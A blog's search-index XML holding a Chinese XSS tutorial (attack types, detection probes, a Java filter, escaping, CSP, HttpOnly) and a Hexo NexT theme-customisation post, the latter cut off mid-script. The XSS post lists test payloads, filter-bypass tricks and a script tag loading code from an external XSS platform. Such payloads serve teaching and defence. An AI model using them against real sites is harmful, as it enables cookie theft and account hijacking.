<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[XSS的攻击原理与防御原理]]></title>
    <url>%2Fposts%2F9ee0c5.html</url>
    <content type="text"><![CDATA[迟日江山丽，春风花草香 xss又称跨站脚本攻击，原称为css（Cross-Site Scripting），因为和层叠样式表(Cascading Style Sheets)重名，所以又称为xss(x一般有未知的含义，还有扩展的含义)。XSS的攻击原理 xss攻击涉及到了攻击者，用户和web server。主要是利用了网站本身设计的不严谨性，攻击者通过对网页插入恶意的攻击脚本，导致当用户在浏览网页的时候，嵌入其中的攻击脚本就会被执行，从而达到恶意攻击用户的特殊目的。攻击者通过xss攻击，可以获取到用户的cookie，然后发送给攻击者想要攻击的网站，因为跨站了，所以也称为跨站脚本攻击。XSS的分类 根据攻击的来源，xss攻击的分类主要分为：反射型xss、存储型xss和DOM型xss三种。反射型xss 反射型xss，也叫“非持久型xss”。用户点击攻击链接，触发了恶意脚本，服务器解析后响应，在返回的响应内容中出现攻击者的xss代码，被浏览器执行。一来一去，xss攻击脚本被web server反射回来给浏览器执行，所以称为反射型xss。反射型xss的攻击步骤： 1、攻击者构造出特殊的URL，其中包含恶意代码； 2、用户打开带有恶意代码的URL时，网站服务端将恶意代码从URL中取出，拼接在HTML中返回给浏览器； 3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行； 4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。特点： 1、攻击脚本非持久性，没有保存在web server中，而是直接出现在了URL地址中； 2、反射型xss漏洞常见于通过URL传递参数的功能，如网站搜索、跳转等； 3、由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。一般通过邮件、社交软件等方式直接发送攻击URL，通过用户的点击来达到攻击目的的。 POST的内容也可以触发反射型xss，只不过其触发条件比较苛刻，需要构造表单提交页面，并引导用户点击，所以非常少见。存储型xss 存储型xss，也叫“持久型xss”，相比反射型xss，存储型xss是把恶意脚本保存到了web server中的，这种攻击具有较强的稳定性和持久性，危害性也更大。这样每一个访问特定网页的用户，都会受到攻击。存储型xss的攻击步骤： 1、攻击者将恶意代码提交到目标网站的数据库中； 2、用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在HTML中返回给浏览器； 3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行； 4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。特点： 1、攻击脚本持久性，保存在web server中； 2、这种攻击常见于带有用户保存数据的网站功能，一般通过论坛发帖、商品评论、用户私信等功能（所有能够向web server输入内容的地方），将攻击脚本存储到web server中。 有时候反射型xss和存储型xss是同时使用的，比如：先通过对一个攻击url进行编码（来绕过xss filter），提交到web server（存储在web server中），然后用户在浏览页面时，如果点击该url，就会触发一个xss攻击。当然用户点击该url时，也可能会触发一个CSRF（Cross site request forgery）攻击。DOM型xss DOM（Document Object Model） –based 漏洞是基于文档对象模型的一种漏洞，通过修改页面的DOM节点而形成的xss漏洞。DOM型xss的攻击步骤： 1、攻击者构造出特殊的URL，其中包含恶意代码。 2、用户打开带有恶意代码的URL。 3、用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。 4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。特点： 1、攻击脚本不与服务端交互的，只与客户端上的js交互，攻击脚本放到了js中执行，然后显示出来； 2、DOM型xss也是一种反射型xss。小结 反射型xss跟存储型xss的区别是：存储型xss非持久性，攻击脚本存在服务器里，反射型xss持久性，攻击脚本存在URL里。 DOM型xss跟前两种xss的区别：DOM型xss，是通过修改页面的DOM节点来形成xss的，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种xss都属于服务端的安全漏洞。|类型|存储区|插入点||-|-||存储型 XSS|后端数据库|HTML||反射型 XSS|URL|HTML||DOM 型 XSS|后端数据库/前端存储/URL|前端 JavaScript|XSS漏洞的检测xss探针 xss探针可检测出网站有没有对xss漏洞做最基础的防御。 在测试xss的位置写入代码，查看页面源码，看看哪些代码被过滤或者转义了。1'';!--"&lt;XSS&gt;=&amp;&#123;()&#125;xss语句 除了xss探针以外，还可以输入最简单的测试语句1&lt;script&gt;alert(/xss/)&lt;/script&gt; 如果插入的语句原封不动的呈现在了浏览器中，那么说明：代码没有被过滤，存在xss；代码没有被执行，因为没有闭合类似textarea标签，可以查看下源码。常用的xss检测语句12345678910111213141516&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;script&gt;alert(/xss/)//&lt;script&gt;alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;&lt;/script&gt;//用分号，也可以分号+空格（回车一起使用）&lt;img src=1 onmouseover=alert(1)&gt;&lt;a herf=1 onload=alert(1)&gt;nmask&lt;/a&gt;&lt;script&gt;window.a==1?1:prompt(a=1)&lt;/script&gt;&lt;script&gt;a=prompt;a(1)&lt;/script&gt;&lt;img src=0 onerror=confirm('1')&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script src="http://xsspt.com/vA4t1W?1542101296"&gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;&lt;a href="javascript:alert(1)"&gt;xss&lt;/a&gt;&lt;svg onload=alert(1)&gt;&lt;input type="text" name="test" onclick=alert(1)&gt;&lt;iframe src="javascript:alert(/xss/)"&gt;xss&lt;/iframe&gt;&lt;iframe srcdoc="&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;"&gt;使用GIthub上的终极xss工具👉传送门1jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e 它能够检测到存在于HTML属性、HTML文字内容、HTML注释、跳转链接、内联JavaScript字符串、内联CSS 样式表等多种上下文中的XSS漏洞，也能检测 eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write()等DOMXSS漏洞，并且能绕过一些XSS过滤器。 只要在网站的各输入框中提交这个字符串，或者把它拼接到URL参数上，就可以进行检测了。自动化扫描工具 除了手动检测之外，还可以使用自动扫描工具寻找xss漏洞，例如 Arachni、Mozilla HTTP Observatory、w3af 等。XSS产生的原因 xss存在的根本原因是，对URL中的参数，对用户输入提交给web server的内容，没有进行充分的过滤。如果我们能够在web程序中，对用户提交的URL中的参数，和提交的所有内容，进行充分的过滤，将所有的不合法的参数和输入内容过滤掉，那么就不会导致在用户的浏览器中执行攻击者自己定制的脚本。 但是，其实充分而完全的过滤，实际上是无法实现的。因为攻击者有各种各样的神奇的，你完全想象不到的方式来绕过服务器端的过滤，最典型的就是对URL和参数进行各种的编码，比如escape, encodeURI, encodeURIComponent, 8进制，10进制，16进制，来绕过xss过滤。那么我们如何来防御xss呢？XSS攻击的防御XSS 攻击有两大要素：1、攻击者提交恶意代码。2、浏览器执行恶意代码。 比较常规的思路是：对输入和URL参数进行过滤，对输出进行编码。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容。然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的xss攻击。XSS filter对输入和URL参数进行过滤（黑白名单），常用的xss filter的实现代码：123456789101112public class XssFilter implements Filter &#123; public void init(FilterConfig config) throws ServletException &#123;&#125; public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest)request); chain.doFilter(xssRequest, response); &#125; public void destroy() &#123;&#125;&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper &#123; HttpServletRequest orgRequest = null; public XssHttpServletRequestWrapper(HttpServletRequest request) &#123; super(request); orgRequest = request; &#125; /** * 覆盖getParameter方法，将参数名和参数值都做xss过滤。&lt;br/&gt; * 如果需要获得原始的值，则通过super.getParameterValues(name)来获取&lt;br/&gt; * getParameterNames,getParameterValues和getParameterMap也可能需要覆盖 */ @Override public String getParameter(String name) &#123; String value = super.getParameter(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * 覆盖getHeader方法，将参数名和参数值都做xss过滤。&lt;br/&gt; * 如果需要获得原始的值，则通过super.getHeaders(name)来获取&lt;br/&gt; * getHeaderNames 也可能需要覆盖 */ @Override public String getHeader(String name) &#123; String value = super.getHeader(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * 将容易引起xss漏洞的半角字符直接替换成全角字符 * * @param s * @return */ private static String xssEncode(String s) &#123; if (s == null || s.isEmpty()) &#123; return s; &#125; StringBuilder sb = new StringBuilder(s.length() + 16); for (int i = 0; i &lt; s.length(); i++) &#123; char c = s.charAt(i); switch (c) &#123; case '&gt;': sb.append('＞');// 全角大于号 break; case '&lt;': sb.append('＜');// 全角小于号 break; case '\'': sb.append('‘');// 全角单引号 break; case '\"': sb.append('“');// 全角双引号 break; case '&amp;': sb.append('＆');// 全角 break; case '\\': sb.append('＼');// 全角斜线 break; case '#': sb.append('＃');// 全角井号 break; case '%': // &lt; 字符的 URL 编码形式表示的 ASCII 字符（十六进制格式） 是: %3c processUrlEncoder(sb, s, i); break; default: sb.append(c); break; &#125; &#125; return sb.toString(); &#125; public static void processUrlEncoder(StringBuilder sb, String s, int index)&#123; if(s.length() &gt;= index + 2)&#123; if(s.charAt(index+1) == '3' &amp;&amp; (s.charAt(index+2) == 'c' || s.charAt(index+2) == 'C'))&#123; // %3c, %3C sb.append('＜'); return; &#125; if(s.charAt(index+1) == '6' &amp;&amp; s.charAt(index+2) == '0')&#123; // %3c (0x3c=60) sb.append('＜'); return; &#125; if(s.charAt(index+1) == '3' &amp;&amp; (s.charAt(index+2) == 'e' || s.charAt(index+2) == 'E'))&#123; // %3e, %3E sb.append('＞'); return; &#125; if(s.charAt(index+1) == '6' &amp;&amp; s.charAt(index+2) == '2')&#123; // %3e (0x3e=62) sb.append('＞'); return; &#125; &#125; sb.append(s.charAt(index)); &#125; /** * 获取最原始的request * * @return */ public HttpServletRequest getOrgRequest() &#123; return orgRequest; &#125; /** * 获取最原始的request的静态方法 * * @return */ public static HttpServletRequest getOrgRequest(HttpServletRequest req) &#123; if (req instanceof XssHttpServletRequestWrapper) &#123; return ((XssHttpServletRequestWrapper) req).getOrgRequest(); &#125; return req; &#125;&#125;然后在web.xml中配置该filter：12345678&lt;filter&gt; &lt;filter-name&gt;xssFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.xxxxxx.filter.XssFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;xssFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; 主要的思路就是将容易导致XSS攻击的边角字符替换成全角字符。&lt;和&gt;是脚本执行和各种html标签需要的，比如 &lt;script&gt;，&amp;和 #以及 %在对URL编码试图绕过xss filter时，会出现。我们说对输入的过滤分为白名单和黑名单。上面的xss filter就是一种黑名单的过滤，黑名单就是列出不能出现的对象的清单，一旦出现就进行处理。还有一种白名单的过滤，白名单就是列出可被接受的内容，比如规定所有的输入只能是大小写的26个英文字母和10个数字，还有-和_，所有其他的输入都是非法的，会被抛弃掉。很显然如此严格的白名单是可以100%拦截所有的xss攻击的，但是现实情况一般是不能进行如此严格的白名单过滤的。 对于输入，处理使用xss filter之外，对于每一个输入，在客户端和服务器端还要进行各种验证，验证是否合法字符，长度是否合法，格式是否正确。在客户端和服务端都要进行验证，因为客户端的验证很容易被绕过。其实这种验证也分为了黑名单和白名单。黑名单的验证就是不能出现某些字符，白名单的验证就是只能出现某些字符。尽量使用白名单，虽然白名单无法完全杜绝xss，但是使用不当的话可能会带来很高的误报率。存储型和反射型XSS攻击的防御 存储型和反射型xss都是在服务端取出恶意代码后，插入到响应HTML里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。预防这两种漏洞，有两种常见做法：改成纯前端渲染，把代码和数据分隔开。纯前端渲染的过程：1、浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。2、然后浏览器执行 HTML 中的 JavaScript。3、JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本.innerText，还是属性.setAttribute，还是样式.style等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。 但纯前端渲染还需注意避免DOM型xss漏洞，例如 onload 事件和 href 中的 javascript:xxx 等。在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接HTML的问题。对HTML做充分转义。 如果拼接HTML是必要的，就需要采用合适的转义库，对HTML模板各处插入点进行充分的转义。 对于HTML转义通常只有一个规则，就是把 &amp; &lt; &gt; &quot; &#39; / 这几个字符转义掉，确实能起到一定的xss防护作用，但并不完善。要完善xss防护措施，要使用更完善更细致的转义策略。例如Java工程里，常用的转义库为 org.owasp.encoder。XSS 安全漏洞简单转义是否有防护作用HTML 标签文字内容有HTML 属性值有CSS 内联样式无内联 JavaScript无内联 JSON无跳转链接无 在输出数据之前对潜在的威胁的字符进行编码、转义对xss攻击能起到一定的防御作用。 对所有要动态输出到页面的内容，通通进行相关的编码和转义。当然转义是按照其输出的上下文环境来决定如何转义的。作为body文本输出，html标签的属性输出，比如：123&lt;span&gt;$&#123;username&#125;&lt;/span&gt;&lt;p&gt;&lt;c:out value="$&#123;username&#125;"&gt;&lt;/c:out&gt;&lt;/p&gt;&lt;input type="text" value="$&#123;username&#125;" /&gt;此时的转义规则如下：&lt;转成 &amp;lt; &gt;转成 &amp;gt; &amp; 转成 &amp;amp; &quot;转成 &amp;quot;&#39;转成 &amp;#39 \转成\\ /转成 \/ ;转成 ；(全角;)javascript事件1&lt;input type="button" οnclick='go_to_url("$&#123;myUrl&#125;");' /&gt;URL属性 如果 &lt;script&gt;、&lt;style&gt;、&lt;imt&gt;等标签的 src 和 href 属性值为动态内容，那么要确保这些URL没有执行恶意连接。确保：href和 src的值必须以 http://开头，白名单方式；不能有10进制和16进制编码字符。DOM型XSS攻击的防御 DOM型xss攻击，实际上就是网站前端JavaScript代码本身不够严谨，把不可信的数据当作代码执行了。 在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为HTML插到页面上，而应尽量使用 .textContent、.setAttribute() 等。 如果用Vue/React技术栈，并且不使用 v-html/dangerouslySetInnerHTML 功能，就在前端render阶段避免 innerHTML、outerHTML 的xss隐患。 DOM中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，&lt;a&gt; 标签的 href 属性，JavaScript的 eval()、setTimeout()、setInterval()等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些API，很容易产生安全隐患，请务必避免。12345678910111213&lt;!-- 内联事件监听器中包含恶意代码 --&gt; &lt; img onclick = "UNTRUSTED" onerror = "UNTRUSTED" src = "data:image/png," &gt; &lt;!-- 链接内包含恶意代码 --&gt; &lt; a href = "UNTRUSTED" &gt; 1 &lt;/ a &gt; &lt; script &gt; // setTimeout()/setInterval() 中调用恶意代码 setTimeout( "UNTRUSTED" )setInterval( "UNTRUSTED" ) // location 调用恶意代码 location.href = 'UNTRUSTED' // eval() 中调用恶意代码 eval ( "UNTRUSTED" ) &lt;/ script &gt;其他xss攻击的防御HttpOnly xss 一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对 Cookie 设置了HttpOnly 属性，那么js脚本将无法读取到cookie，但是浏览器还是能够正常使用cookie，这样能有效的防止xss的攻击。 一般的Cookie都是从document对象中获得的，现在浏览器在设置 Cookie的时候一般都接受一个叫做HttpOnly的参数，跟domain等其他参数一样，一旦这个HttpOnly被设置，你在浏览器的 document对象中就看不到Cookie了，而浏览器在浏览的时候不受任何影响，因为Cookie会被放在浏览器头中发送出去(包括ajax的时候)，应用程序也一般不会在js里操作这些敏感Cookie的，对于一些敏感的Cookie我们采用HttpOnly，对于一些需要在应用程序中用js操作的cookie我们就不予设置，这样就保障了Cookie信息的安全也保证了应用。Content Security Policy（内容安全策略）严格的 CSP 在 XSS 的防范中可以起到以下的作用：禁止加载外域代码，防止复杂的攻击逻辑。禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。合理使用上报可以及时发现 XSS，利于尽快修复问题。输入内容长度控制 对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止xss发生，但可以增加xss攻击的难度。小结 XSS攻击防御方法：XSS filter；纯前端渲染，数据分离；HTML转义；设置HttpOnly属性；设置CSP；限制输入内容的长度XSS绕过的技巧 有xss防御便会有xss绕过防御姿势，这是攻与防不断博弈的表现与成果。大小写绕过1&lt;Script&gt;alert(1)&lt;/Script&gt;双写绕1&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;替换绕过1过滤 alert 用prompt，confirm，top['alert'](1)代替绕过过滤() 用``代替绕过过滤空格 用%0a（换行符）,%0d（回车符），/**/代替绕过小写转大写情况下 字符ſ大写后为S（ſ不等于s）%00截断绕过1&lt;a href=javascr%00ipt:alert(1)&gt;xss&lt;/a&gt;编码绕过123456789实体编码javascrip&amp;#x74;:alert(1) 十六进制javascrip&amp;#116;:alert(1) 十进制unicode编码javascrip\u0074:alert(1)url编码javascrip%74:alert(1)fromCharCode方法绕过12String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))javascript伪协议绕过 无法闭合双引号的情况下，就无法使用onclick等事件，只能伪协议绕过，或者调用外部js换行绕过正则匹配12onmousedown=alert(1)注释符12345678// 单行注释&lt;!-- --!&gt; 注释多行内容&lt;!-- --&gt; 注释多行内容&lt;-- --&gt; 注释多行内容&lt;-- --！&gt; 注释多行内容--&gt; 单行注释后面内容/* */ 多行注释有时还可以利用浏览器的容错性，不需要注释闭合标签空格绕过1&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;@符号绕过url限制1https://www.segmentfault.com@xss.haozi.me/j.js其实访问的是@后面的内容“)逃逸函数后接分号1");alert(1)//\绕过转义限制12\")alert(1) //XSS练习平台 以下是几个XSS攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。alert(1) to win prompt(1) to win XSS game XSS Challenges参考资料前端安全系列（一）：如何防止XSS攻击？浅谈跨站脚本攻击与防御面试问题如何预防xss攻击xss攻击原理与解决方法XSS攻击及预防OWASP Top 10 - 2017]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>跨站脚本攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[定制Hexo+NexT的个性化博客]]></title>
    <url>%2Fposts%2Fccfc6699.html</url>
    <content type="text"><![CDATA[日出江花红胜火，春来江水绿如蓝 前几天，我写了一篇关于如何使用GitHub＋Hexo搭建个人博客的博文，接下来我会以我的博客为例，讲讲如何对NexT主题的个性化定制和一些细节的优化。前言 这篇博客主要是next主题的个性化定制，还有一些细节的优化。在搭建的过程，有一些优化，也是参考了大量之前大佬的教程和结合了一些做的比较优秀的博客，我在这里做了一个集合，同时把自己做的而别人没有做的优化，写出来方便大家。 参考的文章我都会贴出原文链接，但是有一些优化，是我自己辛苦更改样式才做出来的效果，有些也是忘记了具体的修改方法，主要是直接审查元素，一点一点的定位到样式表，一点一点的测试修改，相信通过审查元素，你也可以做到。安装NexT主题 我使用的是比较简约的NexT主题，如果你对其他主题感兴趣，可以点击这里。 安装方法：打开博客根目录下的themes文件夹，右键Git Bash，运行命令：git clone https://github.com/iissnan/hexo-theme-next themes/next 下载好之后，把hexo-theme-next改为next，接着打开next目录下的主题配置文件_config.yml，找到theme字段，把参数改为theme: next，之后在根目录下运行：12hexo cleanhexo s -g关于_config.yml 首先_config.yml，它是主题配置文件，有两个，名字一样比较容易混淆。站点配置文件，位于站点文件夹的根目录下例如我的是H:/blog/_config.yml主题配置文件，位于主题文件夹的根目录下例如我的是H:/blog/themes/next/_config.yml Next这个主题包含4钟风格，默认的是Muse，我使用的是Pisces。你也可以尝试其他风格，具体操作：打开H:/blog/_config.yml，定位到Schemes，想要哪款主题就取消前面的#。12345# Schemes#scheme: Muse#scheme: Mistscheme: Pisces#scheme: GeminiNext主题美化接下来就是主题的美化啦添加Github丝带或者角标效果图实现方法 首先先点击这里或者这里挑选自己喜欢的样式，并复制代码。 打开themes/next/layout/_layout.swig文件，在&lt;header&gt;&lt;/header&gt;之前添加代码，并把href改为你的博客地址添加RSS订阅效果图实现方法 首先在博客的根目录H:/blog，安装Hexo插件，插件会放在node_modules这个文件夹。1npm install --save hexo-generator-feed 接下来打开H:/blog/_config.yml文件，在末尾添加1234# Extensions## Plugins: http://hexo.io/plugins/# RSS订阅plugin: hexo-generator-feed 然后打开H:/blog/themes/next/_config.yml文件,找到rss，添加参数123# hexo-generator-feed required for rss support. Leave rss as blank to use site's feed link.# Set rss to false to disable feed link. Set rss to specific value if you have burned your feed already.rss: /atom.xml添加动态背景效果图实现方法 打开H:/blog/_config.yml文件，找到canvas_nest,把false改为true1234567canvas_nest: enable: true onmobile: true # display on mobile or not color: "0,0,255" # 线条颜色，三个数字分别为(R,G,B) opacity: 0.5 # 线条透明度（0~1） zIndex: -1 # 背景的z-index属性 count: 99 # 线条的总数量鼠标点击特效效果图实现方法 打开H:/blog/themes/next/source/js/src，新建一个firework.js文件，加入以下代码：&quot;use strict&quot;;function updateCoords(e){pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top}function setParticuleDirection(e){var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return{x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)}}function createParticule(e,t){var a={};return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function(){ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()},a}function createCircle(e,t){var a={};return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function(){ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1},a}function renderParticule(e){for(var t=0;t&lt;e.animatables.length;t++){e.animatables[t].target.draw()}}function animateParticules(e,t){for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++){n.push(createParticule(e,t))}anime.timeline().add({targets:n,x:function(e){return e.endPos.x},y:function(e){return e.endPos.y},radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule}).add({targets:a,radius:anime.random(80,160),lineWidth:0,alpha:{value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)},duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0})}function debounce(e,t){var a;return function(){var n=this,i=arguments;clearTimeout(a),a=setTimeout(function(){e.apply(n,i)},t)}}var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl){var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function(){canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)},500),render=anime({duration:1/0,update:function(){ctx.clearRect(0,0,canvasEl.width,canvasEl.height)}});document.addEventListener(tap,function(e){&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))},!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)}&quot;use strict&quot;;function updateCoords(e){pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top}function setParticuleDirection(e){var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return{x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)}}function createParticule(e,t){var a={};return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function(){ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()},a}function createCircle(e,t){var a={};return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function(){ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1},a}function renderParticule(e){for(var t=0;t&lt;e.animatables.length;t++){e.animatables[t].target.draw()}}function animateParticules(e,t){for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++){n.push(createParticule(e,t))}anime.timeline().add({targets:n,x:function(e){return e.endPos.x},y:function(e){return e.endPos.y},radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule}).add({targets:a,radius:anime.random(80,160),lineWidth:0,alpha:{value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)},duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0})}function debounce(e,t){var a;return function(){var n=this,i=arguments;clearTimeout(a),a=setTimeout(function(){e.apply(n,i)},t)}}var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl){var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function(){canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)},500),render=anime({duration:1/0,update:function(){ctx.clearRect(0,0,canvasEl.width,canvasEl.height)}});document.addEventListener(tap,function(e){&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))},!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)}; 然后在H:/blog/themes/next/layout/_layout.swig文件中，&lt;/head&gt;之前加入以下代码：1234&lt;!-- 爆炸红心效果 --&gt;&lt;canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" &gt;&lt;/canvas&gt; &lt;script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="/js/src/yanhuatexiao.js"&gt;&lt;/script&gt; 还可以换成点击出现爱心的特效,方法是一样的。!function(e,t,a){function n(){c(&quot;.heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: &#39;&#39;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 500%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}&quot;),o(),r()}function r(){for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=&quot;left:&quot;+d[e].x+&quot;px;top:&quot;+d[e].y+&quot;px;opacity:&quot;+d[e].alpha+&quot;;transform:scale(&quot;+d[e].scale+&quot;,&quot;+d[e].scale+&quot;) rotate(45deg);background:&quot;+d[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)}function o(){var t=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.οnclick=function(e){t&amp;&amp;t(),i(e)}}function 